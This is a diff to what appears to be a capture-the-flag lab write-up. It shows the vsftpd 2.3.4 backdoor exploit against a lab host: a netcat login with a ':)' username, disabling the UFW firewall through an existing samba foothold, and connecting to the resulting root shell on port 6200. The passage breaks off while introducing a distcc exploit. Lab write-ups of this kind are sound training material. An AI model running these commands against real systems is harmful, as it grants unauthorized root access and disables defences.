@@ -506,11 +506,34 @@ For vsftpd vulnerability, I attempted to break in as below. But initially it was
 # netcat to the target machine with ftp port 21
 nc 10.10.10.3 21
 # then type the username with :) at the end and whatever password to exploit the vuln
-USER tyla:)
-PASS tyla
+220 (vsFTPd 2.3.4)
+user tyla:)
+331 Please specify the password.
+pass tyla
 
 # listen to incoming reverse shell with nc
 nc 10.10.10.3 6200
 ```
 
-Fortunately, I have a foothold into the target with samba thus I c
+Fortunately, I have a foothold into the target with samba thus I check if there is any kind of firewall is running. Yes, indeed. It is running UFW and it blocks the inbound tcp port 6200. So I disable the UFW with the command `ufw disable`. Then try the vsftpd exploit again on it. Viola!, it pops the shell as root this time. 
+
+```bash
+# netcat to the target machine with ftp port 21
+nc 10.10.10.3 21
+# then type the username with :) at the end and whatever password to exploit the vuln
+220 (vsFTPd 2.3.4)
+user tyla:)
+331 Please specify the password.
+pass tyla
+
+# listen to incoming reverse shell with nc
+nc 10.10.10.3 6200
+id
+uid=0(root) gid=0(root)
+whoami
+root
+```
+
+### distcc
+
+This time I would like to use nmap script engine to exploit the target. Let's see if we have any script available in nmap then exploit 
